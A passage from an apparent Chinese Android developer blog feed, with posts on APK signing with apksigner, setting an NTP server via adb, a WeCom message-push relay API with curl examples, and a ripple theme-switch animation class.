d.get<span class="constructor">IntrinsicHeight()</span><span class="operator"> / </span>(<span class="built_in">float</span>) d.get<span class="constructor">IntrinsicWidth()</span>);</span><br><span class="line">            set<span class="constructor">MeasuredDimension(<span class="params">width</span>, <span class="params">height</span>)</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            super.on<span class="constructor">Measure(<span class="params">widthMeasureSpec</span>, <span class="params">heightMeasureSpec</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用时</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;ResizableImageView</span><br><span class="line">    android:<span class="attribute">layout_width</span>=<span class="string">"match_parent"</span></span><br><span class="line">    android:<span class="attribute">layout_height</span>=<span class="string">"wrap_content"</span> /&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓apk签名</title>
      <link href="/2022/an-zhuo-apk-qian-ming/"/>
      <url>/2022/an-zhuo-apk-qian-ming/</url>
      
        <content type="html"><![CDATA[<p>android+apk签名命令 - <a href="https://www.csdn.net/tags/NtDakgwsODk2NjctYmxvZwO0O0OO0O0O.html" target="_blank" rel="noopener">https://www.csdn.net/tags/NtDakgwsODk2NjctYmxvZwO0O0OO0O0O.html</a>  </p><a id="more"></a>  <h4 id="签名的机制有v1-v2-v3-v4："><a href="#签名的机制有v1-v2-v3-v4：" class="headerlink" title="签名的机制有v1,v2,v3,v4："></a>签名的机制有v1,v2,v3,v4：</h4><p>v1:基于 JAR 签名。</p><p>v2:基于Android 7.0 （24）引入。</p><p>v3:基于Android 9.0 （28）引入。</p><p>v4:基于Android 11 （30）引入。</p><p>v1到v2的签名机制是为了解决jar签名机制存在一定的安全性问题，v3的机制，会记录我们之前的签名信息以及新的签名信息，以密钥转轮的方案，来做签名的替换和升级。</p><h4 id="下面是具体命令："><a href="#下面是具体命令：" class="headerlink" title="下面是具体命令："></a>下面是具体命令：</h4><p>1.先找到SDK\build-tools\30.0.3\lib路径，30.0.3代表各个版本号，<br> <strong>(如果在9.0也就是&gt;=24 版本号 &lt;28的包里面进行签名，那么生成的V1和V2是true<br>如果版本号 &gt;=28的包里面签名V1,V2,V3 = true)</strong><br>目前Android Studio打包是V1,V2 = true</p><p>2.使用SDK\build-tools\30.0.3下面的zipalign将安装包对齐，使用zipalign -v -p 4 input.apk output.apk进行对其操作，其中input.apk是需要签名的安装包，output.apk是对齐之后的的安装包。</p><p>3.把对齐后的安装包apk文件放到build-tools\版本号下的lib文件下，使用如下命令：java -jar apksigner.jar sign –ks kestore的路径 –out output.apk input.apk 然后会提示输入keystore的密码，输入后回车即可完成签名。</p><p>4.lib文件下检查是否签名成功：然后输入如下命令：java -jar apksigner.jar verify -v my.apk。如果v1 scheme和v2 scheme的值都为true，即表示签名成功。</p><h4 id="具体执行如下unsign-apk："><a href="#具体执行如下unsign-apk：" class="headerlink" title="具体执行如下unsign.apk："></a>具体执行如下unsign.apk：</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.拷贝unsign.apk到<span class="symbol">D:</span>\Android\SDK\build-tools\<span class="number">30.0</span>.<span class="number">2</span>\<span class="class"><span class="keyword">lib</span> </span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.cd到<span class="symbol">D:</span>\Android\SDK\build-tools\<span class="number">30.0</span>.<span class="number">2</span>执行 </span><br><span class="line"><span class="symbol">D:</span>\Android\SDK\build-tools\<span class="number">30.0</span>.<span class="number">2</span>&gt;zipalign -v -p <span class="number">4</span> <span class="class"><span class="keyword">lib</span>/<span class="title">unsign</span>.<span class="title">apk</span> <span class="title">lib</span>/<span class="title">zip</span>.<span class="title">apk</span> 生成<span class="title">zip</span>的<span class="title">apk</span> </span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.拷贝test.jks（签名文件）到<span class="symbol">D:</span>\Android\SDK\build-tools\<span class="number">30.0</span>.<span class="number">2</span>\<span class="class"><span class="keyword">lib</span>，并<span class="title">cd</span>到<span class="title">lib</span>执行 </span></span><br><span class="line"><span class="symbol">D:</span>\Android\SDK\build-tools\<span class="number">30.0</span>.<span class="number">2</span>\<span class="class"><span class="keyword">lib</span>&gt;<span class="title">java</span> -<span class="title">jar</span> <span class="title">apksigner</span>.<span class="title">jar</span> <span class="title">sign</span> --<span class="title">ks</span> <span class="title">test</span>.<span class="title">jks</span> --<span class="title">out</span> <span class="title">sign</span>.<span class="title">apk</span> <span class="title">zip</span>.<span class="title">apk</span> </span></span><br><span class="line"></span><br><span class="line">生成sign.apk 即签名结束 </span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.查看签名 </span><br><span class="line"><span class="symbol">D:</span>\Android\SDK\build-tools\<span class="number">30.0</span>.<span class="number">2</span>\<span class="class"><span class="keyword">lib</span>&gt;<span class="title">java</span> -<span class="title">jar</span> <span class="title">apksigner</span>.<span class="title">jar</span> <span class="title">verify</span> -<span class="title">v</span> <span class="title">sign</span>.<span class="title">apk</span> </span></span><br><span class="line">结果如下： </span><br><span class="line">Verifies Verified using v1 scheme (JAR signing): <span class="literal">true</span> </span><br><span class="line">Verified using v2 scheme (APK Signature Scheme v2): <span class="literal">true</span> </span><br><span class="line">Verified using v3 scheme (APK Signature Scheme v3): <span class="literal">true</span> </span><br><span class="line">Verified using v4 scheme (APK Signature Scheme v4): <span class="literal">false</span> </span><br><span class="line">Verified <span class="keyword">for</span> <span class="symbol">SourceStamp:</span> <span class="literal">false</span> </span><br><span class="line">Number <span class="keyword">of</span> <span class="symbol">signers:</span> <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">如果未签名那么结果如下： </span><br><span class="line">DOES NOT VERIFY </span><br><span class="line"><span class="symbol">ERROR:</span> Missing META-INF/MANIFEST.MF</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>修改安卓ntp服务器自动校准时间</title>
      <link href="/2022/xiu-gai-an-zhuo-ntp-fu-wu-qi-zi-dong-xiao-zhun-shi-jian/"/>
      <url>/2022/xiu-gai-an-zhuo-ntp-fu-wu-qi-zi-dong-xiao-zhun-shi-jian/</url>
      
        <content type="html"><![CDATA[<p>修改ntp服务器自动校准时间，国内手机一般用不到，主要针对海外版手机，使用安卓adb修改，无需root  </p><a id="more"></a>  <p>adb修改命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell<span class="built_in"> settings </span>put global ntp_server ntp.aliyun.com</span><br></pre></td></tr></table></figure><p>有root直接在终端内执行adb shell后面的内容也可以  </p><p>上面命令使用的阿里ntp服务器，ntp.aliyun.com可以更换到其他ntp服务器  </p><p>阿里其他ntp服务器<br>ntp.aliyun.com<br>ntp1.aliyun.com<br>ntp2.aliyun.com<br>ntp3.aliyun.com<br>ntp4.aliyun.com<br>ntp5.aliyun.com<br>ntp6.aliyun.com<br>ntp7.aliyun.com  </p><blockquote><p>阿里ntp服务器 <a href="https://help.aliyun.com/document_detail/92704.html" target="_blank" rel="noopener">https://help.aliyun.com/document_detail/92704.html</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>企业微信通知</title>
      <link href="/2022/qi-ye-wei-xin-tong-zhi/"/>
      <url>/2022/qi-ye-wei-xin-tong-zhi/</url>
      
        <content type="html"><![CDATA[<div id="txt_view">一个API直接将消息推送到微信</div><a id="more"></a><script>document.getElementById("txt_view").style.display = "none";</script><form id="wxpush" action="https://push.gddhy.net" method="post">    <div>        <label for="corpid">corpid</label>        <input name="corpid" id="corpid" placeholder="corpid">    </div>    <div>        <label for="secret">secret</label>        <input name="secret" id="secret" placeholder="secret">    </div>    <div>        <label for="agentid">agentid</label>        <input onkeyup="this.value=this.value.replace(/\D/g,'')" onafterpaste="this.value=this.value.replace(/\D/g,'')" name="agentid" id="agentid" placeholder="agentid">    </div>    <div>        <label for="msg">msg</label>        <input name="msg" id="msg" placeholder="信息">    </div>    <div>    <button>发送</button>    </div></form><h4 id="简单说明"><a href="#简单说明" class="headerlink" title="简单说明"></a>简单说明</h4><p>企业微信的消息通知需要请求两次API，在小黑屋APP或通知滤盒使用自定义webhook没法实现这种复杂操作，就将这两个api封装成一个，方便调用</p><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>//<span class="keyword">push</span>.gddhy.net</span><br></pre></td></tr></table></figure><p>API支持GET和POST请求，需要参数corpid、secret、agentid、msg，前三个可以在企业微信控制台获取，msg便是要发送到微信的信息</p><p>GET方式使用</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://push.gddhy.net/?corpid=企业id<span class="variable">&amp;secret</span>=应用secret<span class="variable">&amp;agentid</span>=应用agentid<span class="variable">&amp;msg</span>=信息</span><br></pre></td></tr></table></figure><p>POST方式使用</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -<span class="keyword">L</span> -s <span class="string">"https://push.gddhy.net"</span> -X <span class="keyword">POST</span> -<span class="keyword">d</span> '&#123;<span class="string">"corpid"</span>:<span class="string">"企业id"</span>,<span class="string">"secret"</span>:<span class="string">"应用secret"</span>,<span class="string">"agentid"</span>:应用id,<span class="string">"msg"</span>:<span class="string">"消息"</span>&#125;' -<span class="keyword">H</span> <span class="string">"Content-type: application/json"</span> </span><br><span class="line"></span><br><span class="line">curl -<span class="keyword">L</span> -s <span class="string">"https://push.gddhy.net"</span> -X <span class="keyword">POST</span> -<span class="keyword">d</span> <span class="string">"corpid=企业id&amp;secret=应用secret&amp;agentid=应用id&amp;msg=消息"</span> -<span class="keyword">H</span> <span class="string">"Content-type: application/x-www-form-urlencoded"</span></span><br></pre></td></tr></table></figure><p>POST可以带json数据，也可以带form数据  </p><p>获取到企业微信参数后可以直接在上面填写后点击发送测试</p><script>window.addEventListener('load',function(){if(navigator.userAgent.match(/QQ\//i)) {document.getElementById("wxpush").style.display = "none";}})</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>仿酷安客户端的主题切换动画效果</title>
      <link href="/2022/fang-ku-an-ke-hu-duan-de-zhu-ti-qie-huan-dong-hua-xiao-guo/"/>
      <url>/2022/fang-ku-an-ke-hu-duan-de-zhu-ti-qie-huan-dong-hua-xiao-guo/</url>
      
        <content type="html"><![CDATA[<p>这是一个仿酷安主题切换的动画，之前是在 <a href="https://mp.weixin.qq.com/s/WXXMLoFexy5lnTikeXcvEQ" target="_blank" rel="noopener">郭霖的微信公众号</a> 上了解到的，最近想要使用时发现按照Github上的方法添加依赖时已经无法使用，作者在Github上没有留下源码，不过好在在作者Gitee中找到了这份源码，可以直接拿来使用  </p><a id="more"></a>  <p>使用时直接将下面源码添加到程序中就行</p><h4 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h4><table><thead><tr><th align="center">Method</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">create(View onClickView)</td><td align="center">创建动画对象(静态方法)</td></tr><tr><td align="center">setDuration(long duration)</td><td align="center">设置动画时长</td></tr><tr><td align="center">setOnAnimationEndListener(Listener listener)</td><td align="center">动画播放完毕监听器</td></tr><tr><td align="center">start()</td><td align="center">开始播放动画</td></tr></tbody></table><h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">public</span> <span class="type">void</span> onClick(<span class="keyword">View</span> <span class="keyword">view</span>) &#123;</span><br><span class="line">    RippleAnimation.<span class="keyword">create</span>(<span class="keyword">view</span>).setDuration(duration).<span class="keyword">start</span>();</span><br><span class="line">    </span><br><span class="line">    //在这里切换你的主题</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作者的Git<br><a href="https://github.com/wuyr/RippleAnimation" target="_blank" rel="noopener">https://github.com/wuyr/RippleAnimation</a><br><a href="https://gitee.com/dingyi222666/RippleAnimation" target="_blank" rel="noopener">https://gitee.com/dingyi222666/RippleAnimation</a>   </p><h4 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">package com.wuyr.rippleanimation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.animation.Animator;</span><br><span class="line"><span class="keyword">import</span> android.animation.AnimatorListenerAdapter;</span><br><span class="line"><span class="keyword">import</span> android.animation.ValueAnimator;</span><br><span class="line"><span class="keyword">import</span> android.annotation.SuppressLint;</span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.ContextWrapper;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Bitmap;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Canvas;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Paint;</span><br><span class="line"><span class="keyword">import</span> android.graphics.PorterDuff;</span><br><span class="line"><span class="keyword">import</span> android.graphics.PorterDuffXfermode;</span><br><span class="line"><span class="keyword">import</span> android.graphics.RectF;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.view.MotionEvent;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewParent;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by wuyr on 3/15/18 5:23 PM.</span></span><br><span class="line"><span class="comment"> * GitHub: https://github.com/wuyr/RippleAnimation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">@SuppressLint(<span class="string">"ViewConstructor"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RippleAnimation</span> <span class="title">extends</span> <span class="title">View</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Bitmap mBackground;<span class="comment">//屏幕截图</span></span><br><span class="line">    <span class="keyword">private</span> Paint mPaint;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> mMaxRadius, mStartRadius, mCurrentRadius;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> isStarted;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> mDuration;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">float</span> mStartX, mStartY;<span class="comment">//扩散的起点</span></span><br><span class="line">    <span class="keyword">private</span> ViewGroup mRootView;<span class="comment">//DecorView</span></span><br><span class="line">    <span class="keyword">private</span> OnAnimationEndListener mOnAnimationEndListener;</span><br><span class="line">    <span class="keyword">private</span> Animator.AnimatorListener mAnimatorListener;</span><br><span class="line">    <span class="keyword">private</span> ValueAnimator.AnimatorUpdateListener mAnimatorUpdateListener;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> RippleAnimation <span class="title">create</span><span class="params">(View onClickView)</span> </span>&#123;</span><br><span class="line">        Context context = onClickView.getContext();</span><br><span class="line">        <span class="keyword">int</span> newWidth = onClickView.getWidth() / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> newHeight = onClickView.getHeight() / <span class="number">2</span>;</span><br><span class="line">        <span class="comment">//计算起点位置</span></span><br><span class="line">        <span class="keyword">float</span> startX = getAbsoluteX(onClickView) + newWidth;</span><br><span class="line">        <span class="keyword">float</span> startY = getAbsoluteY(onClickView) + newHeight;</span><br><span class="line">        <span class="comment">//起始半径</span></span><br><span class="line">        <span class="comment">//因为我们要避免遮挡按钮</span></span><br><span class="line">        <span class="keyword">int</span> radius = Math.<span class="built_in">max</span>(newWidth, newHeight);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RippleAnimation(context, startX, startY, radius);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">RippleAnimation</span><span class="params">(Context context, <span class="keyword">float</span> startX, <span class="keyword">float</span> startY, <span class="keyword">int</span> radius)</span> </span>&#123;</span><br><span class="line">        super(context);</span><br><span class="line">        <span class="comment">//获取activity的根视图,用来添加本View</span></span><br><span class="line">        mRootView = (ViewGroup) getActivityFromContext(context).getWindow().getDecorView();</span><br><span class="line">        mStartX = startX;</span><br><span class="line">        mStartY = startY;</span><br><span class="line">        mStartRadius = radius;</span><br><span class="line">        mPaint = <span class="keyword">new</span> Paint();</span><br><span class="line">        mPaint.setAntiAlias(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置为擦除模式</span></span><br><span class="line">        mPaint.setXfermode(<span class="keyword">new</span> PorterDuffXfermode(PorterDuff.Mode.CLEAR));</span><br><span class="line">        updateMaxRadius();</span><br><span class="line">        initListener();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * try get host activity from view.</span></span><br><span class="line"><span class="comment">     * views hosted on floating window like dialog and toast will sure return null.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return host activity</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Activity <span class="title">getActivityFromContext</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (context instanceof ContextWrapper) &#123;</span><br><span class="line">            <span class="keyword">if</span> (context instanceof Activity) &#123;</span><br><span class="line">                <span class="keyword">return</span> (Activity) context;</span><br><span class="line">            &#125;</span><br><span class="line">            context = ((ContextWrapper) context).getBaseContext();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Activity not found!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 开始播放动画</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isStarted) &#123;</span><br><span class="line">            isStarted = <span class="literal">true</span>;</span><br><span class="line">            updateBackground();</span><br><span class="line">            attachToRootView();</span><br><span class="line">            getAnimator().start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置动画时长</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RippleAnimation <span class="title">setDuration</span><span class="params">(<span class="keyword">long</span> duration)</span> </span>&#123;</span><br><span class="line">        mDuration = duration;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initListener</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mAnimatorListener = <span class="keyword">new</span> AnimatorListenerAdapter() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> onAnimationEnd(Animator animation) &#123;</span><br><span class="line">                <span class="keyword">if</span> (mOnAnimationEndListener != null) &#123;</span><br><span class="line">                    mOnAnimationEndListener.onAnimationEnd();</span><br><span class="line">                &#125;</span><br><span class="line">                isStarted = <span class="literal">false</span>;</span><br><span class="line">                <span class="comment">//动画播放完毕, 移除本View</span></span><br><span class="line">                detachFromRootView();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        mAnimatorUpdateListener = <span class="keyword">new</span> ValueAnimator.AnimatorUpdateListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> onAnimationUpdate(ValueAnimator animation) &#123;</span><br><span class="line">                <span class="comment">//更新圆的半径</span></span><br><span class="line">                mCurrentRadius = (<span class="keyword">int</span>) (<span class="keyword">float</span>) animation.getAnimatedValue() + mStartRadius;</span><br><span class="line">                postInvalidate();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据起始点将屏幕分成4个小矩形,mMaxRadius就是取它们中最大的矩形的对角线长度</span></span><br><span class="line"><span class="comment">     * 这样的话, 无论起始点在屏幕中的哪一个位置上, 我们绘制的圆形总是能覆盖屏幕</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">updateMaxRadius</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//将屏幕分成4个小矩形</span></span><br><span class="line">        RectF leftTop = <span class="keyword">new</span> RectF(<span class="number">0</span>, <span class="number">0</span>, mStartX + mStartRadius, mStartY + mStartRadius);</span><br><span class="line">        RectF rightTop = <span class="keyword">new</span> RectF(leftTop.right, <span class="number">0</span>, mRootView.getRight(), leftTop.bottom);</span><br><span class="line">        RectF leftBottom = <span class="keyword">new</span> RectF(<span class="number">0</span>, leftTop.bottom, leftTop.right, mRootView.getBottom());</span><br><span class="line">        RectF rightBottom = <span class="keyword">new</span> RectF(leftBottom.right, leftTop.bottom, mRootView.getRight(), leftBottom.bottom);</span><br><span class="line">        <span class="comment">//分别获取对角线长度</span></span><br><span class="line">        <span class="keyword">double</span> leftTopHypotenuse = Math.<span class="built_in">sqrt</span>(Math.<span class="built_in">pow</span>(leftTop.<span class="built_in">width</span>(), <span class="number">2</span>) + Math.<span class="built_in">pow</span>(leftTop.<span class="built_in">height</span>(), <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">double</span> rightTopHypotenuse = Math.<span class="built_in">sqrt</span>(Math.<span class="built_in">pow</span>(rightTop.<span class="built_in">width</span>(), <span class="number">2</span>) + Math.<span class="built_in">pow</span>(rightTop.<span class="built_in">height</span>(), <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">double</span> leftBottomHypotenuse = Math.<span class="built_in">sqrt</span>(Math.<span class="built_in">pow</span>(leftBottom.<span class="built_in">width</span>(), <span class="number">2</span>) + Math.<span class="built_in">pow</span>(leftBottom.<span class="built_in">height</span>(), <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">double</span> rightBottomHypotenuse = Math.<span class="built_in">sqrt</span>(Math.<span class="built_in">pow</span>(rightBottom.<span class="built_in">width</span>(), <span class="number">2</span>) + Math.<span class="built_in">pow</span>(rightBottom.<span class="built_in">height</span>(), <span class="number">2</span>));</span><br><span class="line">        <span class="comment">//取最大值</span></span><br><span class="line">        mMaxRadius = (<span class="keyword">int</span>) Math.<span class="built_in">max</span>(</span><br><span class="line">                Math.<span class="built_in">max</span>(leftTopHypotenuse, 